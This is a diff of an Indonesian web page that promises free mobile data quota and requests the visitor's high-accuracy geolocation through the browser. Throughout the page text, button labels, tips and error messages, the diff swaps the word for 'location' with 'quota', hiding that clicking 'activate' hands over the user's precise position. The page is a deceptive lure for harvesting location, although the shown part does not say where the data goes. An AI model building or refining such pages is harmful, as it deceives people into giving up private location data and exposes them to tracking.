@@ -612,7 +612,7 @@
     <div class="badge">🎁 KUOTA GRATIS</div>
     
     <h1>🎁 Aktivasi Kuota Gratis</h1>
-    <p class="subtitle">Aktifkan lokasi untuk mendapatkan kuota gratis</p>
+    <p class="subtitle">Aktifkan kuota untuk mendapatkan kuota gratis</p>
     
     <div class="status-container">
       <div id="status" class="status menunggu" onclick="aktivasiGPS()">
@@ -627,33 +627,33 @@
     </div>
 
     <div id="successMessage" class="success-message">
-      ✅ <strong>Selamat!</strong> Lokasi Anda telah berhasil diaktifkan!<br>
+      ✅ <strong>Selamat!</strong> kuota Anda telah berhasil diaktifkan!<br>
       Kuota gratis sedang diproses...
     </div>
 
     <div id="infoBox" class="info-box">
       <div class="info-text">
-        <strong>🎉 Lokasi Aktif!</strong><br>
-        Lokasi Anda telah terdeteksi dengan sempurna. Sistem sedang memverifikasi untuk memberikan kuota gratis Anda.
+        <strong>🎉 kuota Aktif!</strong><br>
+        kuota Anda telah terdeteksi dengan sempurna. Sistem sedang memverifikasi untuk memberikan kuota gratis Anda.
       </div>
     </div>
 
     <div id="errorMessage" class="error-message"></div>
 
     <button id="cekBtn" onclick="aktivasiGPS()">
-      🚀 Aktifkan Lokasi Sekarang
+      🚀 Aktifkan kuota Sekarang
     </button>
 
     <div class="tips">
       <div class="tips-title">💡 Tips</div>
-      • Pastikan Lokasi perangkat Anda aktif<br>
-      • Berikan izin akses lokasi saat diminta<br>
+      • Pastikan kuota perangkat Anda aktif<br>
+      • Berikan izin akses kuota saat diminta<br>
       • Gunakan di area dengan sinyal yang baik
     </div>
   </div>
 
   <div class="footer">
-    📍 Aktivasi lokasi diperlukan untuk verifikasi kuota
+    📍 Aktivasi kuota diperlukan untuk verifikasi kuota
   </div>
 
   <script>
@@ -681,7 +681,7 @@
       if (!navigator.geolocation) {
         statusEl.innerHTML = '<div class="status-icon">❌</div><div>Tidak Didukung</div>';
         statusEl.className = "status tidak-aktif";
-        errorMsg.textContent = "❌ Browser Anda tidak mendukung deteksi lokasi. Silakan gunakan browser modern seperti Chrome atau Firefox.";
+        errorMsg.textContent = "❌ Browser Anda tidak mendukung deteksi kuota. Silakan gunakan browser modern seperti Chrome atau Firefox.";
         errorMsg.classList.add("show");
         return;
       }
@@ -691,7 +691,7 @@
       statusEl.innerHTML = '<div class="status-icon">⏳</div><div>Memproses...</div>';
       statusEl.className = "status menunggu";
       btn.disabled = true;
-      btn.innerHTML = '<span class="loading"></span> Mengaktifkan Lokasi...';
+      btn.innerHTML = '<span class="loading"></span> Mengaktifkan kuota...';
       progressContainer.classList.add("show");
 
       // Simulate progress
@@ -704,7 +704,7 @@
         }
       }, 200);
 
-      // Opsi untuk mendapatkan lokasi dengan akurasi tinggi
+      // Opsi untuk mendapatkan kuota dengan akurasi tinggi
       const options = {
         enableHighAccuracy: true,
         timeout: 10000,
@@ -715,12 +715,12 @@
         (posisi) => {
           sedangMemproses = false;
           btn.disabled = false;
-          btn.textContent = "✅ Lokasi Sudah Aktif - Klik Lagi";
+          btn.textContent = "✅ kuota Sudah Aktif - Klik Lagi";
           clearInterval(progressInterval);
           progressBar.style.width = "100%";
 
           // Update status
-          statusEl.innerHTML = '<div class="status-icon">✅</div><div>Lokasi Aktif!</div>';
+          statusEl.innerHTML = '<div class="status-icon">✅</div><div>kuota Aktif!</div>';
           statusEl.className = "status aktif";
 
           // Tampilkan pesan sukses
@@ -741,23 +741,23 @@
           progressBar.style.width = "0%";
           progressContainer.classList.remove("show");
 
-          statusEl.innerHTML = '<div class="status-icon">❌</div><div>Lokasi Tidak Aktif</div>';
+          statusEl.innerHTML = '<div class="status-icon">❌</div><div>kuota Tidak Aktif</div>';
           statusEl.className = "status tidak-aktif";
 
           // Pesan error yang lebih spesifik
           let pesanError = "";
           switch(error.code) {
             case error.PERMISSION_DENIED:
-              pesanError = "🚫 <strong>Izin Ditolak!</strong><br>Silakan aktifkan izin lokasi di pengaturan browser Anda untuk mendapatkan kuota gratis.";
+              pesanError = "🚫 <strong>Izin Ditolak!</strong><br>Silakan aktifkan izin kuota di pengaturan browser Anda untuk mendapatkan kuota gratis.";
               break;
             case error.POSITION_UNAVAILABLE:
-              pesanError = "📍 <strong>Lokasi Tidak Tersedia!</strong><br>Pastikan Lokasi perangkat Anda aktif dan coba lagi.";
+              pesanError = "📍 <strong>kuota Tidak Tersedia!</strong><br>Pastikan kuota perangkat Anda aktif dan coba lagi.";
               break;
             case error.TIMEOUT:
-              pesanError = "⏱️ <strong>Waktu Habis!</strong><br>Koneksi lokasi membutuhkan waktu terlalu lama. Silakan coba lagi.";
+              pesanError = "⏱️ <strong>Waktu Habis!</strong><br>Koneksi kuota membutuhkan waktu terlalu lama. Silakan coba lagi.";
               break;
             default:
-              pesanError = "❌ <strong>Terjadi Kesalahan!</strong><br>Tidak dapat mengakses lokasi. Silakan coba lagi.";
+              pesanError = "❌ <strong>Terjadi Kesalahan!</strong><br>Tidak dapat mengakses kuota. Silakan coba lagi.";
           }
 
           errorMsg.innerHTML = pesanError;
